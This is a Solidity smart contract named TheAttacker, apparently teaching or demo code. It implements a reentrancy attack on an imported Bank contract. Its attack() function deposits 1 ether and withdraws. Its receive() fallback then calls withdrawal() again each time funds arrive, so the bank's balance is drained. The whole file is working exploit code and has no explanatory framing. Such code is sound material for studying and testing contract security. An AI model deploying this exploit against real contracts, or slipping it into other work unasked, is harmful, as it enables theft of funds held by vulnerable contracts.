pragma solidity ^0.8.17;

import "./Bank.sol";

contract TheAttacker {

    Bank public theBank;
    mapping(address => uint) public balances;

    constructor(address _thebankAddress) {
        theBank = Bank(_thebankAddress);
    }

    receive() external payable {
        if (address(theBank).balance >= 1 ether) {
            theBank.withdrawal();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        theBank.deposit{value: 1 ether}();
        theBank.withdrawal();
    }

    function getBalances() public view returns (uint) {
        return address(this).balance;
    }
}
